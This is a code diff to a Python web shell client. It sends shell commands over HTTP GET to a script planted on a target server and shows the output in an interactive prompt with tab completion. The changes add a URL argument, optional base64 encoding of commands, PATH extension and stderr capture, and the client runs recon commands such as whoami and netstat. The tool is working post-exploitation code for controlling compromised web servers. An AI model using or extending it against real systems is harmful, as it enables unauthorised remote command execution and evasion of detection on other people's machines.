@@ -5,10 +5,11 @@
 # Because typing again and again on the browser address bar is quite uneffective. 
 # This wrapper provides you with a way to wrap your address bar query into a nice web shell
 # Bash like completion is a must have
-# Colors are nice. 
-# TODO: command helper (tab + tab / ifconfig )
-# TODO: add assymetrical shell encryption 
+# Colors are nice too. 
+
+# TODO: command helper (tab + tab => ifconfig )
 # TODO: complete http/https support
+# TODO: add assymetrical shell encryption 
 # TODO: Check if metasploit has something similar
 
 import httplib2
@@ -18,12 +19,11 @@ from cmd2 import Cmd
 import urllib
 import os
 import re
+from base64 import b64encode
+from argparse import ArgumentParser
+import traceback
 
-
-http_url_get = sys.argv[1]
-http_server_path = ''
-http_url_post = ''
-http_cookie = 'NULL'
+#TODO: parse args
 
 helpers = [
     "ifconfig",
@@ -32,7 +32,12 @@ helpers = [
     "netstat -antp",
     "ps aux"]
 
+# Used in forge_request
+extra_path = '/sbin:/usr/sbin'
+
 class webshell(Cmd):
+	url = ''
+	enc = 'plain'
 	hostname = ''
 	user = ''
 	path = ''
@@ -55,12 +60,17 @@ class webshell(Cmd):
 	def colorize(self, val, color):
 		return self.colorcodes[color][True] + val + self.colorcodes[color][False]
 
-	def init(self):
+	def init(self, url, enc):
+		self.url = url
+		self.enc = enc
+		self.get_remote_info()
+		self.set_prompt()
+
+	def get_remote_info(self):
 		self.username = self.ask_server('whoami')
 		self.hostname = self.ask_server('hostname -s')
 		self.path = self.ask_server('pwd')
 		self.home = os.path.normpath(self.path)
-		self.set_prompt()
 
 
 	def set_prompt(self):
@@ -79,8 +89,10 @@ class webshell(Cmd):
 		#self.prompt = '{'+ retcode + '}' + username + '@' + hostname + ':' + self.path + self.prompt_suffix + ' '
 	
 	def ask_server(self, request):
+		if self.enc == 'base64':
+			request = b64encode(request)
 		req = urllib.quote_plus(request)
-		resp, content = self.h.request(http_url_get + req , "GET")	
+		resp, content = self.h.request(self.url + req , "GET")	
 		self.status = str(resp.status)
 		#ret = content
 		ret = content.strip()
@@ -98,7 +110,7 @@ class webshell(Cmd):
 			exit()
 	
 	def forge_request(self, path, cmd ):
-		req = 'cd ' + path + ';' + cmd
+		req = "export PATH=$PATH:" + extra_path + "; cd " + path + ';' + cmd + " 2>&1;"
 		return req
 
 	def default(self, line):
@@ -146,11 +158,30 @@ class webshell(Cmd):
 	
 	def preloop(self):
 		pass
-		
-try:
-	ws = webshell()
-	ws.init()
-	ws.cmdloop()
-except :
-	print 'exception'
+
+class arg_parser:
+	enc = ''
+	url = ''
+	parser = ArgumentParser(description="Let the web be command-line.")
+
+	def __init__(self):
+		self.parser.add_argument("url", help="Enter the full target URL where the shell/cmd can be executed.Example: www.example.com/shell.php")
+		self.parser.add_argument("-e", "--enc", action="store", dest="enc", default='plain', help="Encoding/encryption to use. (Default: plain) ")
+		self.args = self.parser.parse_args()
+		self.enc = self.args.enc
+		self.url = self.args.url
+
+		# DELETE sys.argv (since everything has been parsed)
+		del sys.argv[1:]
+
+if __name__ == "__main__":		
+	try:
+		params = arg_parser()
+
+		ws = webshell()
+		ws.init(params.url, params.enc)
+		ws.cmdloop()
+	except :
+		print 'exception'
+		print traceback.format_exc()
 
